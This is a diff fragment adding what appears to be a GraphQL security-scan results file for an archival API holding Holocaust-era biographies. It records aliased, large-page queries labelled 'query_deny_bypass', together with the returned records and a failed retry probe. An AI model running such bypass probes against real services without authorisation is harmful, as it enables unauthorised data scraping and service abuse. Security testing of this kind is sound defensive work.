+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1907 in Klosterneuburg. Died 1947 in Litom\u011b\u0159ice. Austrian SS-Obersturmf\u00fchrer and commander in Terez\u00edn. Rahm worked at the Central Office for Jewish Emigration in Vienna and Prague. Commandant of Terez\u00edn from February 1944 - May 1945."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born in 1902. SS-Obersturmbannf\u00fchrer and Deputy Camp Commander of Terez\u00edn from 1941 - 1945."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1895 in D\u00e4tzdorf. Died 1990 in Kronberg. German SS-Sturmbannf\u00fchrer. Worked at the \"Umwandererzentrale\" in \u0141\u00f3d\u017a. In 1941 Skarabis was temporary Commander of Terez\u00edn. After the war Skarabis was sentenced to four years of prison."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "jc-persons",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1915 in Vienna. Died 1977 in Vienna. Robert Prochnik worked for the Jewish Community from 1938 onwards, working closely together with Benjamin Murmelstein. Prochnik had to work together with the Central Office for Jewish Emigration in Vienna and was involved in the transports to the East. In September 1942 he was arrested by the Gestapo and sent to Terez\u00edn, where he survived the war. In 1948 he was accused of collaboration with the Nazis, but set free soon afterwards. Prochnik died in 1977."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1916 in Vienna. Died 1997 in Vienna. Franzi L\u00f6w was working in the resistance and was an employee in the Welfare Department of the Jewish Community in Vienna. She took the custodianship for 200 Jewish children and took guadianship for further 20 mentally handicapped children. By forging documents she saved these children from the transport into Death Camps. From 1942 onwards she was leading the Welfare Department of the Jewish Community in Vienna. She helped several Jews hiding with food stamps. Franzi L\u00f6w survived in Vienna."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1884 in Piwowszczyzna (Galicia). Died 1960 in New York. Head of the Jewish Community in Vienna between 1938 and 1945. L\u00f6wenherz was a Zionist and lawyer and later \"Elder of the Jews\" in Vienna. In May 1945 he was arrested by the Red Army. L\u00f6wenherz died in New York in 1960."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Orthodox rabbi, head of the Central Office of the Autonomous Orthodox Israelite Denomination of Hungary, and member of the First and Second Jewish Council. In the summer of 1944, he resigned from his position and went into hiding. After the war he became the head of the national Orthodox organisation again. He left Hungary in 1950 \u2013 first emigrating to Israel, then to the US."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Factory owner, member of the First and Second Jewish Councils. As of 1939, he was president of the Budapest Autonomous Orthodox Israelite Congregation. In early August 1944 he escaped with his family to Romania. After the war he lived in Israel where he testified at the Eichmann trial in 1961."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Engineer, head of the Central Jewish Council\u2019s Technical Department from April 1944, head of the Ghetto Police and one of the leaders of the \u201clarge\u201d ghetto in Budapest during the Arrow Cross era. Domonkos was a World War I veteran and captain of the Hungarian army in the interwar period. Between 1945 and 1950 he became chief secretary (f\u0151titk\u00e1r) of the Pest Israelite Congregation. In 1953 he was arrested by the communist regime on fabricated charges. Although he was released at the end of 1953 he died within months as a result of the torture he endured in prison."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Chief Rabbi of Szigetv\u00e1r and member of the Second, Third and Fourth Jewish Councils. He was suspected of being an informant for the government. In 1946 he was sentenced to ten years in prison for collaborating with the Hungarian authorities during the Holocaust, but acquitted on appeal in 1947. In 1948, Berend emigrated to the United States where he changed his name to Albert B. Belton."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1898 in Trn\u011bn\u00fd \u00dajezd. During WWII an employee of the Jewish Community in Prague, in the Personnel Office. Deported to Terez\u00edn in February 1945. After WWII worked for the company Kley in Prague, which specialised in textiles."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Jewish community leader, member of the Fourth Jewish Council. He was vice president, and as of 1939, president of the Neologue Sz\u00e9kesfeh\u00e9rv\u00e1r Israelite Congregation (Sz\u00e9kesfeh\u00e9rv\u00e1ri Izraelita Hitk\u00f6zs\u00e9g). On January 15, 1945 he was murdered by Arrow Cross militiamen in Budapest."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Lawyer, Jewish community leader, member of the First, Second and Third Jewish Council. After graduation, he worked for the Budapest Stock Exchange and various large industrial companies. In 1941 he was appointed member of the governing committee (v\u00e1lasztm\u00e1ny) of the Neologue Pest Israelite Congregation. In 1944, as member of President Samu Stern\u2019s inner circle, he belonged to the Jewish Council\u2019s informal leadership. After the war he became director-in-chief of the Hungarian Sugar Industry Trust. In 1948 he left Hungary and settled in Switzerland, where he died in 1951."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Industrialist, member of the Third and Fourth Jewish Councils. During the Sz\u00e1lasi regime, he became de facto head of the Council and one of the leaders of the \u201clarge\u201d ghetto of Budapest. After the war, he became President of the Pest Israelite Congregation and the National Office of Hungarian Israelites. In 1950, St\u00f6ckler was appointed head of the National Representation of Hungarian Israelites (Magyar Izraelit\u00e1k Orsz\u00e1gos K\u00e9pviselete), the unified organisation of Hungarian Jewish communities forcefully set up by the communist regime. In January 1953, he was arrested on fabricated charges of murdering Raoul Wallenberg in 1945 and brutally tortured. He was convicted, but released in early 1954. In 1956 he emigrated to Australia. "
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Banker, Jewish community leader, president of the Jewish Council throughout its entire existence. Stern\u2019s started his career as a wholesale food distributor, later he became the chief executive of one of Hungary\u2019s largest financial institutions. He became involved in Jewish community life in the interwar period. In 1929, he was elected president of the Pest Israelite Congregation and in 1932 of the National Office of Hungarian Israelites. After the German occupation of Hungary in March 1944, Stern was appointed head of the Jewish Council by the Nazis. He led the organisation until the Arrow Cross takeover in October 1944. Although he was officially president of the Fourth Jewish Council as well, he spent the last months of the war in hiding. In 1945, he was charged with collaboration and an investigation was initiated against him, but the case did not come to trial."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Lawyer, Jewish community leader, member of the First, Second and Third Jewish Council. He trained as a lawyer in Budapest and worked as an attorney. He was involved in the community work of the Pest Israelite Congregation, of which he was appointed vice president in 1941. In 1944, as a member of President Samu Stern\u2019s inner circle, he belonged to the Jewish Council\u2019s informal leadership. In 1955 he emigrated to Brazil, where he died in the 1960s."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Lawyer, publicist, legal scholar, high-ranking official of Jewish Council. He worked for the Pest Israelite Congregation from the early 1920s, first as a secretary (titk\u00e1r), then as legal representative (\u00fcgy\u00e9sz), later as chief secretary (f\u0151titk\u00e1r). Between 1934 and 1942 he was head of the Hungarian Jewish Museum (Magyar Zsid\u00f3 M\u00fazeum). After the war he became the Executive Director (\u00fcgyvezet\u0151 igazgat\u00f3) of the National Office of Hungarian Israelites."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1904. Was a motorcycle and car racer, as well as a salesman for JAWA motorcycle and cars and the Zl\u00edn Z-XII aircraft produced by the Ba\u0165a company. In 1932 they won the silver medal for Czechoslovakia at the legendary International Six Days Trial. During WWII an employee of the Personnel Office at the Jewish Community in Prague. Together with his son Ivan he survived the war in Prague. He was not deported due to his (so-called) mixed marriage."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1894 in Prague. Died 1967 in Prague. Important Hebrew scholar and historian. At the beginning of WWI travelled together with his friend Ji\u0159\u00ed Mordechai Langer (author of Nine Gates) to Galicia, stayed in a Hasidic community in Belz and spent several years in Rzeczic, where he studied halakha and hasidic liturature. Received rabbinic ordination. In 1922 returned to Prague, was active in Chevra kadisha. During WWII worked for the Central Jewish Museum in Prague. Deportated to Terez\u00edn in July 1943, worked in the library, cataloged Hebrew books that had been confiscated from libraries by the Nazis. After WWII worked at the Jewish Museum in Prague, where he documented books and archival holdings."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1915. Died 1945 in Auschwitz or Dachau. In 1933 emigrated to Palestine. Expelled from the country by the authorities due to his political (Communist) activities. Returned to Prague, studied medicine. During WWII worked at the Treuhandstelle at the Jewish Community in Prague. Unsuccessfully tried to get visa to USA and Australia. Deported to Terez\u00edn in September 1943. Transported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1886 in Prague. In 1945 dissappeared without trace in Auschwitz. Art historian, museum specialist. Czech-Jew. Director of the state East Slovak Museum in Ko\u0161ice. In 1942 became the main curator of the Jewish Central Museum in Prague. Became involed in the resistance movement, arrested by the Gestapo in August 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1896. Died 1943 in Auschwitz. Photographer. One of five photographers who are known to have worked for the Jewish Community in Prague during the war. From the remaining records it seems, that whilst others were involved more with news footage, Viktor Sch\u00fcck was employed at the Central Jewish Museum where he specialised in documenting collection pieces, buildings and cemeteries. Deported to Terez\u00edn in July 1943. Transported to Auschwitz in September 1943."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1906 in Mn\u00ed\u0161ek pod Brdy. Died 1944 in Auschwitz. Worked as a civil servent in Prague. During WWII worked as a correspondent for the Jewish Community in Prague. Her husband was an employee of the Financial Department at the Jewish Community in Prague. She was deported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1904 in Jarom\u011b\u0159. Died 1985 in Prague. Art historian, director of the Jewish Museum in Prague. Worked in Municipal library of Prague, then in the library of the Museum of Decorative Arts in Prague. From 1943 worked for the Central Jewish Museum in Prague. Deported to Terez\u00edn in February 1945. After WWII worked in the Jewish Museum in Prague, became the director."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1883 in Vienna. Died 1944 in Auschwitz. Lawyer and member of the Jewish Council of the Elders in Vienna. Transported to Terez\u00edn in January 1943. Transported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1892 in Brno. Died 1944 in Auschwitz. Architect. Zionist. Worked  for the Jewish Community in Prague, was in charge of the Collection \"Opfer Aufbau Leben\",which rich Jewish citizen contributed to to help Jewish elderly, sick or poor people and orphans. In December 1941 deported to Terez\u00edn. Deputy Elder of the Jews in Terez\u00edn and member of the Council of the Elders of the Jews in Terez\u00edn. Transported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1900 in \u0158e\u010dany nad Labem. Businessman. In 1913 moved with his parents to Vienna. After annexation of Austria into Nazi Germany converted to Roman Catholic Church and moved back to Czechoslovakia. During WWII employee of the Jewish Community in Prague, but the exact department is unknown. Deported to Terez\u00edn in February 1945. After WWII moved to D\u011b\u010d\u00edn."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1893 in Dob\u0159\u00ed\u0161. Died most probably 1945 in Prague. Worked for insurance company Koruna in Prague. During WWII employee of the Jewish Community in Prague, worked at the Department for Emigration. In August 1940 he was arrested for a few days for an unknown reason."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1898 in \u010cesk\u00fd Krumlov. Died 1956 in Jind\u0159ich\u016fv Hradec. Engineer in a textile factory. Studied at technical university in Vienna. During WWI he served in Galicia. Worked in Southern Bohemia in a textile factory. During WWII he worked for the Jewish Community in Prague at the Jewish Labour Department. Deported to Terez\u00edn in February 1945. After the war he returned to work in the same textile factory."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1903 in Slovansk\u00e9 Lhota. Died in 1950. Worked for the Electrical Utilities of Prague as driver and ticket collector. Was a football referee. During WWII employee of the Jewish Community in Prague, not certain of what department. Unsuccessfully tried to emigrate to Shanghai. He was not deported due to his (so-called) mixed marriage with Bo\u017eena Hlav\u00e1\u010dkov\u00e1. In 1947 changed family surname to J\u00e1nsk\u00fd."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1899. Died 1944 in Auschwitz. Baroness Franti\u0161ka Gutmannov\u00e1 (ne\u00e9 Mayov\u00e1) was the wife of the industrial magnate Vil\u00e9m Gutmann, co-owner of Gebr\u00fcder Gutmann. Amongst other things, this company owned coal mines in Upper Silesia and, with the Rothschilds, founded what is now the V\u00edtkovice Ironworks. Vil\u00e9m Gutmann emigrated before the outbreak of war. Franti\u0161ka remained alone in Prague with her four children Eli\u0161ka, Zuzana, Gertruda and Franti\u0161ek. During WWII she worked for the Jewish Community in Prague, in the stock of the Treuhandstelle. In the summer of 1944, together with her children, she was arrested by the Gestapo unknown reasons. After being inprisoned in Prague's Pankr\u00e1c Prison and the Small Fortress in Terez\u00edn, they were all \u2013 with the exception of Franti\u0161ek who had died five days earlier \u2013 sent to Auschwitz in October 1944. According to available information, Eli\u0161ka was the only one to survive."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1903 in Prague. Died in the 1950s. Civil servant. Unsuccessfully tried to get visa to USA. From 1944 worked at workshop of the Council of the Elders in Prague. Deported to Terez\u00edn in February 1945."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1913 in Prague. Died 1996. Lawyer. During WWII an employee of the Jewish Community in Prague. One of the leading figure of the Prague\u00b4s lawyer community after WWII. 1948 - 1954 was the head of the political section of the President\u00b4s Office. Worked as a professor at the Faculty of Law of the Charles University in Prague (1951-1990s). Member of the Federal Assembly until 1971."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1877 in Byst\u0159ice pod Host\u00fdnem (Czech Republic). Died 1938 in Dachau. Ehrlich was a Zionist and later represented the Jewish Community in Vienna to the Austro-fascist government. He was transported with the so-called \"Prominententransport\" (prominent people's transport) to Dachau immediately after the Anschluss where he was executed some weeks later."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1894 in Mikulov (Nikolsburg). Feldsberg studied law in Vienna and also worked for the Jewish Community in Vienna from November 1938 onwards. Feldberg became head of the Cemetary Department of the Jewish Community. In 1943 he was transported to Terez\u00edn together with his wife, where he survived. Between 1963 and 1970 Ernst Feldsberg was Head of the Jewish Community in Vienna."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1881. Died 1958. Emil Engel was a member of the board of the Jewish Community in Vienna from 1926. Between 1928 and 1940 Engel was head of the Social Welfare Department. Engel emigrated to the United States in 1940."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1875 in Vienna. Died 1954 in Vienna. Officer in the Austrian-Hungarian Army. President of the Higher Regional Court in Vienna. Professor for civil law. Chief judge of the Ghetto Court in Terez\u00edn. Member of the Council of the Elders of the Jews in Terez\u00edn. Transported to Terez\u00edn in September 1942. Survived."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1904 in Jihlava. Died 1970. During WWII worked at the Jewish Community in Prague, officer at the Legal and Information Service Department, later Head of the Department. He was not deported due to his (so-called) mixed marriage."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                }
+              ]
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.591,
+        "timestamp": "2025-10-06T02:20:06.218619Z",
+        "response_body": {
+          "data": {
+            "s1": {
+              "items": [
+                {
+                  "id": "ehri_cb"
+                },
+                {
+                  "id": "ehri_pers"
+                },
+                {
+                  "id": "terezin-victims"
+                },
+                {
+                  "id": "terezin-persons"
+                },
+                {
+                  "id": "jc-persons"
+                }
+              ]
+            },
+            "s2": {
+              "items": [
+                {
+                  "id": "ehri_cb"
+                },
+                {
+                  "id": "ehri_pers"
+                },
+                {
+                  "id": "terezin-victims"
+                },
+                {
+                  "id": "terezin-persons"
+                },
+                {
+                  "id": "jc-persons"
+                }
+              ]
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-06T02:20:06.218709Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.582,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s1: authoritativeSets(first: 500) {\n    items {\n      id\n    }\n  }\n  s2: authoritativeSets(after: \"cursor500\", first: 500) {\n    items {\n      id\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.984,
+        "timestamp": "2025-10-06T02:20:10.079029Z",
+        "response_body": {
+          "data": {
+            "authoritativeSets": {
+              "items": [
+                {
+                  "id": "ehri_cb",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Velika \u017dupa was the highest regional authority in the Independent State of Croatia. It was responsible only to the Poglavnik Ante Paveli\u0107, who personally named its leader, and to the respective state ministries. Velika \u017dupa Posavje was founded on 10 June 1941 with the seat in the contemporary town of Slavonski Brod and continued to function until 1945. Velika \u017dupa Posavje included the administrative units (kotar) of Bijeljina, Br\u010dko, Brod na Savi, Derventa, Grada\u010dac and \u017dupanja. "
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "ehri_pers",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Prof. Yeshayahu A. Jelinek was an historian of East-Central Europe, particularly of Slovakia. He focused primarily on the history of the Jews in Slovakia, autochthonous fascism and antisemitism, the Holocaust, the tensions and overlaps between nationalism and communism, the German-Israeli relations."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Chackelis Kibarskis gim\u0117 1903-10-14 Lazdij\u0173 rajone \u0160e\u0161tok\u0173 kaime.\r\n1918\u20131923 m. mok\u0117si Marijampol\u0117s \u017eyd\u0173 (hebraj\u0173) gimnazijoje.\r\n1923\u20131928 m. studijavo Vytauto Did\u017eiojo universiteto Medicinos fakultete.\r\n1932\u20131936 m. tobulinosi Prahos (\u010cekija) ir Vienos (Austrija) klinikose, 1936\u20131938 m. \u2013 Ciuricho (\u0160veicarija) klinikose.\r\n1930\u20131934 m. buvoo Kauno \u017eyd\u0173 ligonin\u0117s Vidaus lig\u0173 skyriaus gydytojas asistentas, 1934\u20131941 m. \u2013 to paties skyriaus ved\u0117jas.\r\n1942\u20131946 m. \u2013 Raudonosios armijos 16-osios lietuvi\u0161kosios \u0161auli\u0173 divizijos vyriausias terapeutas, Medicinos bataliono vadas.\r\n\r\n1946\u20131952 m. Ch. Kibarskis dirbo Vilniaus universiteto Medicinos fakulteto Hospitalin\u0117s terapijos katedros asistentu, docentu, 1972\u20131988 m. \u2013 profesoriumi, konsultantu.\r\n\r\nCh. Kibarskiui 1970 m. suteiktas medicinos moksl\u0173 daktaro laipsnis, 1972 m. - profesorius.\r\n1995\u20132003 m. Chackelis Kibarskis gyveno Lietuvoje ir Izraelyje.\r\nCh. Kibarskis vienas pirm\u0173j\u0173 Lietuvoje organizavo ir pl\u0117tojo elektrokardiografijos tyrimus, daugiau kaip 180 mokslini\u0173 publikacij\u0173 apie hipertonin\u0119, plau\u010di\u0173, kasos ligas, cukrin\u012f diabet\u0105 autorius arba bendraautorius. \r\nChackelis Kibarskis mir\u0117 2003 m. sausio 05 d. Vilniuje."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
